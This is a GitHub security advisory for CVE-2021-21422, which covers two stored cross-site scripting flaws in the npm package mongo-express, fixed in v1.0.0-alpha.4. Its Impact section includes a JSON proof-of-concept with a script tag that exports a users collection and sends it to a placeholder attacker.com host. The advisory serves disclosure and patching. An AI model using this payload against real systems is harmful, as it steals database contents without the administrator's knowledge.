# [H] Cross-site scripting

## Summary
Severity: High
Advisory: GHSA-7p8h-86p5-wv3p
CVE: CVE-2021-21422
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2021-06-28
Source: https://github.com/advisories/GHSA-7p8h-86p5-wv3p
Type: github-advisory

## Affected
- npm: `mongo-express` — affected >=0 <1.0.0-alpha.4

## Details
Two kinds of XSS were found:

1.  As mentioned in https://github.com/mongo-express/mongo-express/issues/577 when the content of a cell grows larger than supported size, clicking on a row will show full document unescaped, however this needs admin interaction on cell.
2. Data cells identified as media will be rendered as media, without being sanitized. Example of different renders: image, audio, video, etc.



### Impact
As an example of type 1 attack, an unauthorized user who only can send a large amount of data in a field of a document may use this payload:
```JSON
{"someField": "long string here to surpass the limit of document ...... <script> await fetch('http://localhost:8081/db/testdb/export/users').then( async res =>  await fetch('http://attacker.com?backup='+encodeURIComponent((await res.text())))) </script>"  }
```
This will send an export of a collection to the attacker without even admin knowing. Other types of attacks such as dropping a database\collection are also possible.

### Patches
Upgrade to  `v1.0.0-alpha.4`

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [mongo-express](https://github.com/mongo-express/mongo-express/issues/new)
* Email me at [jafar.akhoondali@gmail.com](mailto:jafar.akhoondali@gmail.com)

## References
- https://github.com/mongo-express/mongo-express/security/advisories/GHSA-7p8h-86p5-wv3p
- https://nvd.nist.gov/vuln/detail/CVE-2021-21422
- https://github.com/mongo-express/mongo-express/issues/577
- https://github.com/mongo-express/mongo-express/commit/f5e0d4931f856f032f22664b5e5901d5950cfd4b
